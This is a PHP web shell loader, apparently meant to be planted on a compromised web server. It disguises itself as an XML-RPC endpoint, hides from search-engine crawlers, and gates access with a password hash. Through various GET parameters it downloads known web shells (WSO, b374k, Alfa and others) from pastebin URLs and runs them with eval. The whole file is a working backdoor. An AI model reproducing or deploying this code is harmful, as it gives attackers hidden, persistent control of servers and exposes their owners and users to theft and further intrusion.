<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
$su = "300bf52dd231262bc2b99237e727246d"; // 

function Login() {
	if(isset($_GET['istriku']))
			{
				echo '<body >
				<center>
				<br><br><br><br><br><br><br>
				<form method="post">
				<input style="color:white" type="password" name="pass"><input type="submit" value="Login" style="background:white"></button>
				 </form>
				 </center>
				 
				 ';
		}else{
				echo '<html>
						<head>
						  <title>minishell priv8</title>
						  <body>
						XML-RPC server accepts POST requests only.
						  </body>
						 </head>
					</html>
						 ';
		}
	exit;
}
	$default_charset = 'UTF-8';
		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
			    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
			        header('HTTP/1.0 404 Not Found');
				        exit;
		    }
		}
		if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
		    if( empty($su) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $su) ) )
		        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
		    else
		        Login();
		echo "<font>BERHASIL LOGIN KONTOL <form method='post' action='?keluar' ><button>KELUAR ANJING</button></form></font>";
		if (isset($_GET["logout"])) {
		    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
		    print "<script>window.location='?';</script>";
		}

if(isset($_GET['ids'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/XYsscrm8"));
	}
if(isset($_GET['marijuana'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/tizUkMj9"));
	}
if(isset($_GET['hanna'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/W8aTqnsP"));
	}
if(isset($_GET['alfa'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/Y720Q1m2"));
	}
if(isset($_GET['mini'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/brjiCbDT"));
	}
if(isset($_GET['b374k'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/AZ1QJ9ny"));
	}
if(isset($_GET['wso'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/D5ighUB5"));
	}
if(isset($_GET['bypass'])){
		eval("?>".file_get_contents("https://pastebin.com/raw/4sqcJeTk"));
	}
?>